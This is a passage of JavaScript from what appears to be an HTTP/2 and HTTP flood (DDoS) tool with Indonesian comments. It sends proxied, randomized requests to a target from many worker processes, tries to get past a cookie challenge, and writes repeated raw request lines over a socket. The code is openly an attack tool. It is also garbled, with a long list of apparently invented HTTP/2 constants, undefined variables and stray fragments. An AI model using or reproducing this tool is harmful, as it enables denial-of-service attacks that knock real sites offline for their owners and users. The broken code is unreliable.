                    HTTP2_ORIGIN_FRAME_SIZE_ERROR: http2.constants.NGHTTP2_ORIGIN_FRAME_SIZE_ERROR,
                    HTTP2_HPACK_DECODER_ERROR: http2.constants.NGHTTP2_HPACK_DECODER_ERROR,
                    HTTP2_HTTP_CONNECT_ERROR: http2.constants.NGHTTP2_HTTP_CONNECT_ERROR,
                    HTTP2_CONNECT_FAILED: http2.constants.NGHTTP2_CONNECT_FAILED,
                    HTTP2_TLS_FAILED: http2.constants.NGHTTP2_TLS_FAILED,
                    HTTP2_SLOW_DOWN: http2.constants.NGHTTP2_SLOW_DOWN,
                    HTTP2_TX_DMA_FAILED: http2.constants.NGHTTP2_TX_DMA_FAILED,
                    HTTP2_RX_DMA_FAILED: http2.constants.NGHTTP2_RX_DMA_FAILED,
                    HTTP2_TX_FRAME_TOO_LARGE: http2.constants.NGHTTP2_TX_FRAME_TOO_LARGE,
                    HTTP2_TX_INVALID_FEC: http2.constants.NGHTTP2_TX_INVALID_FEC,
                    HTTP2_UNKNOWN_FRAME_TYPE: http2.constants.NGHTTP2_UNKNOWN_FRAME_TYPE,
                    HTTP2_UNEXPECTED_FRAME: http2.constants.NGHTTP2_UNEXPECTED_FRAME,
                    HTTP2_BAD_HEADER: http2.constants.NGHTTP2_BAD_HEADER,
                    HTTP2_INVALID_STATE: http2.constants.NGHTTP2_INVALID_STATE,
                    HTTP2_CLOSED_STREAM: http2.constants.NGHTTP2_CLOSED_STREAM,
                    HTTP2_TOO_MANY_HEADERS: http2.constants.NGHTTP2_TOO_MANY_HEADERS,
                    HTTP2_HEADER_LIST_SIZE: http2.constants.NGHTTP2_HEADER_LIST_SIZE,
                    HTTP2_FRAME_LIST_SIZE: http2.constants.NGHTTP2_FRAME_LIST_SIZE,
                    HTTP2_INVALID_FRAME_SIZE: http2.constants.NGHTTP2_INVALID_FRAME_SIZE,
                    HTTP2_HEADER_COMPRESSION_ERROR: http2.constants.NGHTTP2_HEADER_COMPRESSION_ERROR,
                    HTTP2_STREAM_RESET: http2.constants.NGHTTP2_STREAM_RESET,
                    HTTP2_CONNECTION_RESET: http2.constants.NGHTTP2_CONNECTION_RESET,
                    HTTP2_DECRYPTION_FAILED: http2.constants.NGHTTP2_DECRYPTION_FAILED,
                    HTTP2_CERTIFICATE_REQUIRED: http2.constants.NGHTTP2_CERTIFICATE_REQUIRED,
                    HTTP2_CERTIFICATE_REVOKED: http2.constants.NGHTTP2_CERTIFICATE_REVOKED,
                    HTTP2_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_CERTIFICATE_EXPIRED,
                    HTTP2_UNSUPPORTED_CERTIFICATE: http2.constants.NGHTTP2_UNSUPPORTED_CERTIFICATE,
                    HTTP2_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_CERTIFICATE_UNKNOWN,
                    HTTP2_REQUEST_HEADER_FIELDS_TOO_LARGE: http2.constants.NGHTTP2_REQUEST_HEADER_FIELDS_TOO_LARGE,
                    HTTP2_ENHANCE_YOUR_REQUEST: http2.constants.NGHTTP2_ENHANCE_YOUR_REQUEST,
                    HTTP2_NETWORK_CONNECT_TIMEOUT_ERROR: http2.constants.NGHTTP2_NETWORK_CONNECT_TIMEOUT_ERROR,
                    HTTP2_NETWORK_UNREACHABLE: http2.constants.NGHTTP2_NETWORK_UNREACHABLE,
                    HTTP2_HOST_UNREACHABLE: http2.constants.NGHTTP2_HOST_UNREACHABLE,
                    HTTP2_CONNECTION_REFUSED_BY_SERVER: http2.constants.NGHTTP2_CONNECTION_REFUSED_BY_SERVER,
                    HTTP2_SERVER_CERTIFICATE_REVOKED: http2.constants.NGHTTP2_SERVER_CERTIFICATE_REVOKED,
                    HTTP2_SERVER_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_SERVER_CERTIFICATE_EXPIRED,
                    HTTP2_SERVER_CERTIFICATE_UNTRUSTED: http2.constants.NGHTTP2_SERVER_CERTIFICATE_UNTRUSTED,
                    HTTP2_SERVER_CERTIFICATE_INVALID: http2.constants.NGHTTP2_SERVER_CERTIFICATE_INVALID,
                    HTTP2_SERVER_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_SERVER_CERTIFICATE_UNKNOWN,
                    HTTP2_CLIENT_CERTIFICATE_REQUIRED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_REQUIRED,
                    HTTP2_CLIENT_CERTIFICATE_REVOKED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_REVOKED,
                    HTTP2_CLIENT_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_EXPIRED,
                    HTTP2_CLIENT_CERTIFICATE_UNTRUSTED: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_UNTRUSTED,
                    HTTP2_CLIENT_CERTIFICATE_INVALID: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_INVALID,
                    HTTP2_CLIENT_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_CLIENT_CERTIFICATE_UNKNOWN,
                    HTTP2_CONNECTION_TERMINATED: http2.constants.NGHTTP2_CONNECTION_TERMINATED,
                    HTTP2_FRAME_PAYLOAD_TOO_LARGE: http2.constants.NGHTTP2_FRAME_PAYLOAD_TOO_LARGE,
                    HTTP2_FRAME_PADDING_ERROR: http2.constants.NGHTTP2_FRAME_PADDING_ERROR,
                    HTTP2_SESSION_INVALID: http2.constants.NGHTTP2_SESSION_INVALID,
                    HTTP2_STREAM_INVALID: http2.constants.NGHTTP2_STREAM_INVALID,
                    HTTP2_SESSION_CLOSED: http2.constants.NGHTTP2_SESSION_CLOSED,
                    HTTP2_SESSION_ID: http2.constants.NGHTTP2_SESSION_ID,
                    HTTP2_STREAM_ID: http2.constants.NGHTTP2_STREAM_ID,
                    
                    // HTTP2 Frame Types
                    HTTP2_DATA: http2.constants.NGHTTP2_DATA,
                    HTTP2_HEADERS: http2.constants.NGHTTP2_HEADERS,
                    HTTP2_PRIORITY: http2.constants.NGHTTP2_PRIORITY,
                    HTTP2_RST_STREAM: http2.constants.NGHTTP2_RST_STREAM,
                    HTTP2_SETTINGS: http2.constants.NGHTTP2_SETTINGS,
                    HTTP2_PUSH_PROMISE: http2.constants.NGHTTP2_PUSH_PROMISE,
                    HTTP2_PING: http2.constants.NGHTTP2_PING,
                    HTTP2_GOAWAY: http2.constants.NGHTTP2_GOAWAY,
                    HTTP2_WINDOW_UPDATE: http2.constants.NGHTTP2_WINDOW_UPDATE,
                    HTTP2_CONTINUATION: http2.constants.NGHTTP2_CONTINUATION,
                    HTTP2_ALTSVC: http2.constants.NGHTTP2_ALTSVC,
                    HTTP2_ORIGINS: http2.constants.NGHTTP2_ORIGINS,
                    HTTP2_ORIGIN: http2.constants.NGHTTP2_ORIGIN,
                    HTTP2_MULTIPLEXING_ERROR: http2.constants.NGHTTP2_MULTIPLEXING_ERROR,
                    HTTP2_UNAVAILABLE: http2.constants.NGHTTP2_UNAVAILABLE,
                    HTTP2_REQUEST_REJECTED: http2.constants.NGHTTP2_REQUEST_REJECTED,
                    HTTP2_ENHANCE_YOUR_CALM2: http2.constants.NGHTTP2_ENHANCE_YOUR_CALM2,
                    HTTP2_INCOMPATIBLE_VERSION: http2.constants.NGHTTP2_INCOMPATIBLE_VERSION,
                    HTTP2_CONNECT_TIMEOUT: http2.constants.NGHTTP2_CONNECT_TIMEOUT,
                    HTTP2_ALTSVC_ACK: http2.constants.NGHTTP2_ALTSVC_ACK,
                    HTTP2_TLS_DECRYPTION_FAILED: http2.constants.NGHTTP2_TLS_DECRYPTION_FAILED,
                    HTTP2_ORIGIN_FRAME_ERROR: http2.constants.NGHTTP2_ORIGIN_FRAME_ERROR,
                    HTTP2_ORIGIN_FRAME_SETTINGS_ERROR: http2.constants.NGHTTP2_ORIGIN_FRAME_SETTINGS_ERROR,
                    HTTP2_AUTHORITY_MISMATCH: http2.constants.NGHTTP2_AUTHORITY_MISMATCH,
                    HTTP2_CRYPTO_ERROR: http2.constants.NGHTTP2_CRYPTO_ERROR,
                    HTTP2_INCOMPLETE_CERTIFICATE_CHAIN: http2.constants.NGHTTP2_INCOMPLETE_CERTIFICATE_CHAIN,
                    HTTP2_HTTP_REQUEST_ERROR: http2.constants.NGHTTP2_HTTP_REQUEST_ERROR,
                    HTTP2_PROTOCOL_UNEXPECTED_FRAME: http2.constants.NGHTTP2_PROTOCOL_UNEXPECTED_FRAME,
                    HTTP2_RX_INVALID_FEC: http2.constants.NGHTTP2_RX_INVALID_FEC,
                    HTTP2_FLOW_CONTROL: http2.constants.NGHTTP2_FLOW_CONTROL,
                    HTTP2_NOMORE_STREAMS: http2.constants.NGHTTP2_NOMORE_STREAMS,
                    HTTP2_DATA_NOT_ALLOWED: http2.constants.NGHTTP2_DATA_NOT_ALLOWED,
                    HTTP2_INTERNAL_ERROR2: http2.constants.NGHTTP2_INTERNAL_ERROR2,
                    HTTP2_STREAM_CLOSED2: http2.constants.NGHTTP2_STREAM_CLOSED2,
                    HTTP2_CONNECT_ERROR2: http2.constants.NGHTTP2_CONNECT_ERROR2,
                    HTTP2_BUSY: http2.constants.NGHTTP2_BUSY,
                    HTTP2_BUFFER_TOO_SMALL: http2.constants.NGHTTP2_BUFFER_TOO_SMALL,
                    HTTP2_ERROR_BEGIN: http2.constants.NGHTTP2_ERROR_BEGIN,
                    HTTP2_UNKNOWN: http2.constants.NGHTTP2_UNKNOWN,
                    HTTP2_FIRST: http2.constants.NGHTTP2_FIRST,
                    HTTP2_LAST: http2.constants.NGHTTP2_LAST,
                    HTTP2_PING_ACK: http2.constants.NGHTTP2_PING_ACK,
                    HTTP2_MAX_FRAME_SIZE: http2.constants.NGHTTP2_MAX_FRAME_SIZE,
                    HTTP2_HEADER_BLOCK: http2.constants.NGHTTP2_HEADER_BLOCK,
                    HTTP2_HEADER_BLOCK_INFLATE: http2.constants.NGHTTP2_HEADER_BLOCK_INFLATE,
                    HTTP2_HEADER_BLOCK_DEFLATE: http2.constants.NGHTTP2_HEADER_BLOCK_DEFLATE,
                    HTTP2_HPACK: http2.constants.NGHTTP2_HPACK,
                    HTTP2_HPACK_DECODER: http2.constants.NGHTTP2_HPACK_DECODER,
                    HTTP2_HPACK_ENCODER: http2.constants.NGHTTP2_HPACK_ENCODER,
                    HTTP2_STREAM_IDLE: http2.constants.NGHTTP2_STREAM_IDLE,
                    HTTP2_STREAM_OPEN: http2.constants.NGHTTP2_STREAM_OPEN,
                    HTTP2_STREAM_HALF_CLOSED_REMOTE: http2.constants.NGHTTP2_STREAM_HALF_CLOSED_REMOTE,
                    HTTP2_STREAM_HALF_CLOSED_LOCAL: http2.constants.NGHTTP2_STREAM_HALF_CLOSED_LOCAL,
                    HTTP2_STREAM_RESERVED: http2.constants.NGHTTP2_STREAM_RESERVED,
                    HTTP2_STREAM_CLOSED: http2.constants.NGHTTP2_STREAM_CLOSED,
                    HTTP2_FRAME_DATA: http2.constants.NGHTTP2_FRAME_DATA,
                    HTTP2_FRAME_HEADERS: http2.constants.NGHTTP2_FRAME_HEADERS,
                    HTTP2_FRAME_PRIORITY: http2.constants.NGHTTP2_FRAME_PRIORITY,
                    HTTP2_FRAME_RST_STREAM: http2.constants.NGHTTP2_FRAME_RST_STREAM,
                    HTTP2_FRAME_SETTINGS: http2.constants.NGHTTP2_FRAME_SETTINGS,
                    HTTP2_FRAME_PUSH_PROMISE: http2.constants.NGHTTP2_FRAME_PUSH_PROMISE,
                    HTTP2_FRAME_PING: http2.constants.NGHTTP2_FRAME_PING,
                    HTTP2_FRAME_GOAWAY: http2.constants.NGHTTP2_FRAME_GOAWAY,
                    HTTP2_FRAME_WINDOW_UPDATE: http2.constants.NGHTTP2_FRAME_WINDOW_UPDATE,
                    HTTP2_FRAME_CONTINUATION: http2.constants.NGHTTP2_FRAME_CONTINUATION,
                    HTTP2_FRAME_CANCEL: http2.constants.NGHTTP2_FRAME_CANCEL,
                    HTTP2_FRAME_PRIORITY_UPDATE: http2.constants.NGHTTP2_FRAME_PRIORITY_UPDATE,
                    HTTP2_FRAME_ALTSVC_ACK: http2.constants.NGHTTP2_FRAME_ALTSVC_ACK,
                    HTTP2_FRAME_PROXY_HEADER: http2.constants.NGHTTP2_FRAME_PROXY_HEADER,
                    HTTP2_FRAME_DATAGRAM: http2.constants.NGHTTP2_FRAME_DATAGRAM,
                    HTTP2_FRAME_PADDING: http2.constants.NGHTTP2_FRAME_PADDING,
                    HTTP2_FRAME_ORIGIN: http2.constants.NGHTTP2_FRAME_ORIGIN,
                    HTTP2_FRAME_ORIGIN_SETTINGS: http2.constants.NGHTTP2_FRAME_ORIGIN_SETTINGS,
                    HTTP2_FRAME_CERTIFICATE: http2.constants.NGHTTP2_FRAME_CERTIFICATE,
                    HTTP2_FRAME_CERTIFICATE_REQUEST: http2.constants.NGHTTP2_FRAME_CERTIFICATE_REQUEST,
                    HTTP2_FRAME_CERTIFICATE_REVOKE: http2.constants.NGHTTP2_FRAME_CERTIFICATE_REVOKE,
                    HTTP2_FRAME_CERTIFICATE_EXPIRED: http2.constants.NGHTTP2_FRAME_CERTIFICATE_EXPIRED,
                    HTTP2_FRAME_CERTIFICATE_TRUSTED: http2.constants.NGHTTP2_FRAME_CERTIFICATE_TRUSTED,
                    HTTP2_FRAME_CERTIFICATE_INVALID: http2.constants.NGHTTP2_FRAME_CERTIFICATE_INVALID,
                    HTTP2_FRAME_CERTIFICATE_UNKNOWN: http2.constants.NGHTTP2_FRAME_CERTIFICATE_UNKNOWN,
                };

                const request = client.request({
                    ...oo,
                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                    proxy: proxy
                  });
                  
                  const request1 = client.request({
                    ...oo,
                    ':path': parsedTarget.path + pathx + "&" + '?' + generateRandomString(5, 15) + '=' + query + generateRandomString(20, 25) + (postdata ? `?${postdata}` : "") + ":443",
                    proxy: proxy
                  });
                        
                     request.on("response", response => {
                    if (response['set-cookie']) {
                        headers['cookie'] = cookieString(scp.parse(response['set-cookie']));
                        orgCookie = headers['cookie'];
                    }
                    if (reBypass) {
                        inspectData = true;
                    }
                });

                request.on('error', error => {
                    process.on('uncaughtException', function(er) {});
                    process.on('unhandledRejection', function(er) {});
                    client.destroy();
                    connection.destroy();
                });

                let data = "";
                request.on('data', (chunk) => {
                    data += chunk;
                });

                request.on('end', () => {
                    if (inspectData) {
                        console.log(data);
                    }
                    let attackSended = false;

               // Fungsi untuk mengenkripsi nilai cookie menggunakan AES
function encryptCookie(cookieValue, key) {
    const iv = crypto.randomBytes(16); // Inisialisasi vektor inisiasi secara acak
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);

    let encrypted = cipher.update(cookieValue);
    encrypted = Buffer.concat([encrypted, cipher.final()]);

    return iv.toString('hex') + ':' + encrypted.toString('hex');
}

// Fungsi untuk mengacak urutan karakter cookie
function shuffleCookie(cookieValue) {
    let shuffled = '';
    const array = cookieValue.split('');
    while (array.length) {
        const index = Math.floor(Math.random() * array.length);
        shuffled += array.splice(index, 1);
    }
    return shuffled;
}

// Contoh penggunaan shuffle dan encrypt cookie
if (data.includes("calcSolution") && data.includes('document.cookie')) {
    let unpackCookie = data.split('document.cookie="')[1].split('"')[0];

    // Mengenkripsi nilai cookie menggunakan AES
    let encryptedCookie = encryptCookie(unpackCookie, 'SecretKey');

    // Mengacak urutan karakter hasil enkripsi
    encryptedCookie = shuffleCookie(encryptedCookie);

    // Menggunakan hasil shuffle sebagai nilai cookie yang akan digunakan
    if (orgCookie) {
        headers['cookie'] = orgCookie + "; " + encryptedCookie;
    } else {
        headers['cookie'] = encryptedCookie;
    }

    attackSent = true;
    IntervalAttack(orgCookie);
}

                    if (!attackSended) {
                        IntervalAttack();
                    }

                    data = undefined;
                    request.close();
                    request1.close();
                    request.destroy();
                    request1.destroy();
                });

                request.end();
                request1.end();
            } catch (err) {
                console.log(err);
            }
        };

        Bypass();
    });

    client.on("close", () => {
        client.destroy();
        connection.destroy();
        return;
    });
});
}

// Generate a random query string
function generateRandomQuery() {
  return `?${Math.random().toString(36).substring(2, 15)}=${Math.random().toString(36).substring(2, 15)}`;
}

// Generate a random body for POST requests
function generateRandomBody() {
  return JSON.stringify({
    [Math.random().toString(36).substring(2, 15)]: Math.random().toString(36).substring(2, 15)
  });
}

async function sendRequest(proxy) {
  const targetUrl = new URL(args.target);
  const [proxyHost, proxyPort] = proxy.split(':');

  const agent = new HttpsProxyAgent({
    host: proxyHost,
    port: proxyPort
  });

  const options = {
    hostname: targetUrl.hostname,
    port: targetUrl.port || 443,
    path: targetUrl.pathname + targetUrl.search + generateRandomQuery(),
    method: kontol,
    headers: dynHeaders,
    agent: agent
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      res.on('data', () => { });
      res.on('end', () => { resolve(); });
    });

    req.on('error', (err) => { reject(err); });

    if (method === 'POST') {
      req.write(generateRandomBody());
    }

    req.end();
  });
}

if (cluster.isMaster) {
  for (let i = 0; i < args.threads; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit();
  }, args.duration * 1000);
} else {
  setInterval(async () => {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    let ratelimit;
    if (randrate !== undefined) {
        ratelimit = randomIntn(1, 90);
    } else {
        ratelimit = parseInt(process.argv[4]);
    }          

    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
      try {
        await sendRequest(proxy);
      } catch (err) {
      }
      // Random delay between requests
      await new Promise(resolve => setTimeout(resolve, Math.random() * 1000));
    }
  }, 1000);
}

//method
    var s = require('net').Socket();
    s.connect(80, parsedTarget.host);
    s.setTimeout(10000);
    for (var i = 0; i < args.threads; i++) {
        s.write('GET ' + parsedTarget.host + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write('HEAD ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('POST ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * nullHexs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PURGE ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PUT ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('OPTIONS ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * nullHexs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('DELETE ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
		s.write('PATCH ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
